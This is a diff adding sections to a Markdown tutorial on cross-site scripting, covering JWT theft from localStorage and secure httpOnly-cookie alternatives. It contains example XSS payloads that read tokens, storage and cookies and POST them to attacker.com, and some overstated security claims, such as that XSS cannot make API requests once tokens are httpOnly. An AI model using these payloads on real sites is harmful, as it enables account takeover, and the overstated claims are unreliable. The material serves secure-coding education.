@@ -5,7 +5,9 @@
 2. [Types of XSS](#types-of-xss)
 3. [How XSS Attacks Work](#how-xss-attacks-work)
 4. [Real-Life Cases](#real-life-cases)
+   - [Case 6: JWT Token Theft via localStorage XSS](#case-6-jwt-token-theft-via-localstorage-xss-modern-spa-vulnerability)
 5. [XSS Examples](#xss-examples)
+   - [Example 5: JWT Token Theft from localStorage](#example-5-jwt-token-theft-from-localstorage-via-xss)
 6. [Prevention Techniques](#prevention-techniques)
 7. [Testing for XSS](#testing-for-xss)
 
@@ -255,6 +257,129 @@ This is especially dangerous because:
 
 ---
 
+### Case 6: JWT Token Theft via localStorage XSS (Modern SPA Vulnerability)
+
+**Vulnerability:** Many single-page applications (SPAs) store JWT authentication tokens in localStorage for convenience, but this is extremely dangerous because JavaScript can access localStorage. If XSS is present, attackers can steal the JWT token.
+
+**Typical Vulnerable Implementation:**
+
+```javascript
+// Frontend: Storing JWT in localStorage (VULNERABLE!)
+function login(username, password) {
+  fetch('/api/auth/login', {
+    method: 'POST',
+    body: JSON.stringify({ username, password })
+  })
+  .then(res => res.json())
+  .then(data => {
+    // Storing JWT in localStorage - accessible to any JavaScript!
+    localStorage.setItem('authToken', data.token);
+  });
+}
+
+// Using the token in API calls
+function fetchUserData() {
+  const token = localStorage.getItem('authToken'); // Attacker can steal this!
+  fetch('/api/user', {
+    headers: {
+      'Authorization': `Bearer ${token}`
+    }
+  })
+  .then(res => res.json())
+  .then(data => renderUserData(data));
+}
+```
+
+**Attack Scenario:**
+
+```javascript
+// Attacker injects this XSS payload (via comment, profile, chat, etc.)
+<script>
+  // Steal the JWT token from localStorage
+  const token = localStorage.getItem('authToken');
+  
+  // Send it to attacker's server
+  fetch('https://attacker.com/steal-token', {
+    method: 'POST',
+    body: JSON.stringify({
+      token: token,
+      userAgent: navigator.userAgent,
+      timestamp: new Date()
+    })
+  });
+  
+  // Also steal other valuable data
+  const userData = {
+    localStorage: Object.keys(localStorage).reduce((obj, key) => {
+      obj[key] = localStorage.getItem(key);
+      return obj;
+    }, {}),
+    sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => {
+      obj[key] = sessionStorage.getItem(key);
+      return obj;
+    }, {}),
+    cookies: document.cookie
+  };
+  
+  fetch('https://attacker.com/steal-data', {
+    method: 'POST',
+    body: JSON.stringify(userData)
+  });
+</script>
+```
+
+**Real-World Impact:**
+
+1. **Immediate Account Access**: Attacker now has valid JWT token
+2. **Impersonation**: Can make API calls as the victim user
+3. **Long-Term Access**: JWT tokens are often valid for hours/days
+4. **Data Theft**: Access to personal data, messages, financial info
+5. **Account Takeover**: Change password, enable 2FA with attacker's phone
+6. **Lateral Movement**: Use victim's account to attack other users
+
+**Case Study: A Real E-commerce Platform**
+
+```
+Scenario:
+- Online store uses React SPA with JWT auth
+- Stores JWT token in localStorage
+- Has Stored XSS vulnerability in product reviews
+
+Attack Timeline:
+1. Attacker posts malicious review with XSS payload
+2. Victim user browses products and reads review
+3. XSS payload executes, steals JWT from localStorage
+4. Attacker now has victim's valid JWT token
+5. Attacker makes API calls as victim:
+   - Views order history and payment methods
+   - Views saved addresses
+   - Changes account email
+   - Places fraudulent orders
+   - Steals credit card information from profile
+
+Result:
+- Multiple accounts compromised
+- Fraudulent orders worth $50,000+
+- Customer data breach affecting thousands
+```
+
+**Why This is So Dangerous:**
+
+```
+Comparison of Token Storage Methods:
+
+┌─────────────────┬──────────────┬─────────────────┬──────────────┐
+│ Storage Method  │ XSS Access   │ CSRF Protection │ Convenience  │
+├─────────────────┼──────────────┼─────────────────┼──────────────┤
+│ localStorage    │ YES (DANGER!)│ No              │ High         │
+│ sessionStorage  │ YES (DANGER!)│ No              │ High         │
+│ httpOnly Cookie │ NO (SAFE)    │ Yes             │ Low          │
+│ Memory Only     │ NO (SAFE)    │ Manual CSRF     │ Low          │
+└─────────────────┴──────────────┴─────────────────┴──────────────┘
+```
+
+---
+
 ## XSS Examples
 
 ### Example 1: Simple Alert-Based Injection
@@ -336,6 +461,293 @@ https://example.com/?name=<script>alert('XSS')</script>
   }
 </script>
 ```
+
+---
+
+### Example 5: JWT Token Theft from localStorage via XSS
+
+**VULNERABLE: Storing JWT in localStorage**
+
+```javascript
+// ❌ VULNERABLE CODE - DO NOT USE
+
+// Login and store token in localStorage
+class AuthService {
+  async login(username, password) {
+    const response = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
+    
+    const { token } = await response.json();
+    
+    // DANGEROUS: Storing JWT in localStorage
+    // Any JavaScript on the page can access this!
+    localStorage.setItem('jwtToken', token);
+  }
+  
+  // Using the token
+  getAuthHeader() {
+    const token = localStorage.getItem('jwtToken'); // Accessible to XSS!
+    return {
+      'Authorization': `Bearer ${token}`
+    };
+  }
+}
+
+// If XSS exists anywhere on the app, attacker can do this:
+const stolenToken = localStorage.getItem('jwtToken');
+fetch('https://attacker.com/tokens', {
+  method: 'POST',
+  body: JSON.stringify({ token: stolenToken })
+});
+
+// Attacker can now impersonate the user forever (or until token expires)
+```
+
+**Impact Diagram:**
+
+```mermaid
+graph TD
+    A["User logs in to SPA"] -->|Receives JWT Token| B["App stores in localStorage"]
+    B -->|XSS payload injected| C["JavaScript steals from localStorage"]
+    C -->|Sends to attacker| D["Attacker has valid JWT"]
+    D -->|Can impersonate user| E["Unauthorized API calls"]
+    E -->|Access control bypassed| F["Data breach / Account takeover"]
+```
+
+---
+
+**SECURE: Using httpOnly Cookies**
+
+```javascript
+// ✅ SECURE CODE - RECOMMENDED
+
+// Backend: Set JWT in httpOnly cookie
+app.post('/api/login', (req, res) => {
+  const { username, password } = req.body;
+  
+  // Validate credentials
+  const user = validateCredentials(username, password);
+  if (!user) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+  
+  // Generate JWT
+  const token = jwt.sign(
+    { userId: user.id, email: user.email },
+    process.env.JWT_SECRET,
+    { expiresIn: '1h' }
+  );
+  
+  // Set as httpOnly cookie (NOT accessible to JavaScript!)
+  res.cookie('authToken', token, {
+    httpOnly: true,      // ✅ JavaScript cannot access this
+    secure: true,        // ✅ Only sent over HTTPS
+    sameSite: 'Strict',  // ✅ Prevents CSRF attacks
+    maxAge: 3600000      // ✅ Expires in 1 hour
+  });
+  
+  res.json({ success: true });
+});
+
+// Frontend: No need to manage token - browser sends it automatically
+class AuthService {
+  async fetchUserData() {
+    // Token is automatically sent in cookie
+    // XSS cannot access it because it's httpOnly!
+    const response = await fetch('/api/user', {
+      credentials: 'include' // Include cookies in request
+    });
+    
+    return response.json();
+  }
+}
+
+// Even if XSS exists, attacker cannot steal the token:
+const token = localStorage.getItem('authToken'); // undefined
+const cookie = document.cookie; // Doesn't include authToken!
+```
+
+---
+
+**ALTERNATIVE: In-Memory Storage + Refresh Token Rotation**
+
+If you must store JWT in client-side JavaScript, use in-memory storage with refresh tokens:
+
+```javascript
+// ✅ SAFER ALTERNATIVE (but still less secure than httpOnly)
+
+class AuthService {
+  // Store in memory, not persisted
+  private accessToken: string | null = null;
+  
+  async login(username: string, password: string) {
+    const response = await fetch('/api/login', {
+      method: 'POST',
+      credentials: 'include', // Accept cookies
+      body: JSON.stringify({ username, password })
+    });
+    
+    const { accessToken } = await response.json();
+    
+    // Store only in memory (lost on page refresh)
+    this.accessToken = accessToken;
+  }
+  
+  // Get token from memory
+  getToken(): string | null {
+    return this.accessToken;
+  }
+  
+  // On page reload, use refresh token stored in httpOnly cookie
+  async refreshAccessToken(): Promise<string> {
+    const response = await fetch('/api/refresh', {
+      method: 'POST',
+      credentials: 'include' // Include refresh token cookie
+    });
+    
+    const { accessToken } = await response.json();
+    this.accessToken = accessToken;
+    return accessToken;
+  }
+}
+
+// Benefits:
+// - XSS cannot steal access token from memory (would be lost on page refresh anyway)
+// - Only short-lived access tokens are at risk
+// - Refresh token stays in httpOnly cookie
+// - User must re-authenticate on page reload
+```
+
+---
+
+**BEST PRACTICE: Complete Secure Implementation**
+
+```javascript
+// ✅ BEST PRACTICE - Production-Ready
+
+// Backend (Node.js/Express)
+const express = require('express');
+const jwt = require('jsonwebtoken');
+const app = express();
+
+app.post('/api/auth/login', (req, res) => {
+  const { username, password } = req.body;
+  
+  // Validate credentials
+  const user = validateUser(username, password);
+  if (!user) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+  
+  // Short-lived access token (15 minutes)
+  const accessToken = jwt.sign(
+    { userId: user.id, type: 'access' },
+    process.env.JWT_SECRET,
+    { expiresIn: '15m' }
+  );
+  
+  // Longer-lived refresh token (7 days)
+  const refreshToken = jwt.sign(
+    { userId: user.id, type: 'refresh' },
+    process.env.REFRESH_SECRET,
+    { expiresIn: '7d' }
+  );
+  
+  // Set tokens
+  res.cookie('accessToken', accessToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'Strict',
+    maxAge: 15 * 60 * 1000 // 15 minutes
+  });
+  
+  res.cookie('refreshToken', refreshToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'Strict',
+    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
+  });
+  
+  res.json({ success: true, userId: user.id });
+});
+
+app.post('/api/auth/refresh', (req, res) => {
+  const refreshToken = req.cookies.refreshToken;
+  
+  if (!refreshToken) {
+    return res.status(401).json({ error: 'Not authenticated' });
+  }
+  
+  try {
+    // Verify refresh token
+    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
+    
+    // Issue new access token
+    const newAccessToken = jwt.sign(
+      { userId: decoded.userId, type: 'access' },
+      process.env.JWT_SECRET,
+      { expiresIn: '15m' }
+    );
+    
+    res.cookie('accessToken', newAccessToken, {
+      httpOnly: true,
+      secure: true,
+      sameSite: 'Strict',
+      maxAge: 15 * 60 * 1000
+    });
+    
+    res.json({ success: true });
+  } catch (error) {
+    res.status(401).json({ error: 'Invalid refresh token' });
+  }
+});
+
+app.post('/api/auth/logout', (req, res) => {
+  res.clearCookie('accessToken');
+  res.clearCookie('refreshToken');
+  res.json({ success: true });
+});
+
+// Middleware to verify token
+const verifyToken = (req, res, next) => {
+  const token = req.cookies.accessToken;
+  
+  if (!token) {
+    return res.status(401).json({ error: 'No token' });
+  }
+  
+  try {
+    const decoded = jwt.verify(token, process.env.JWT_SECRET);
+    req.userId = decoded.userId;
+    next();
+  } catch (error) {
+    return res.status(401).json({ error: 'Invalid token' });
+  }
+};
+
+app.get('/api/user', verifyToken, (req, res) => {
+  const user = getUser(req.userId);
+  res.json(user);
+});
+```
+
+**Why This is Secure:**
+
+✅ Access token in httpOnly cookie (not accessible to XSS)
+✅ Access token short-lived (15 minutes - limited damage if stolen)
+✅ Refresh token in httpOnly cookie on backend
+✅ XSS cannot see either token
+✅ HTTPS + SameSite prevents network interception and CSRF
+✅ Even if XSS exists, attacker gets limited access before token expires
+
+**If XSS occurs:**
+- Attacker cannot steal tokens (httpOnly)
+- Attacker cannot make API requests (no token in memory)
+- Access expires in 15 minutes
+- User re-authentication required for new access
 
 ---
 
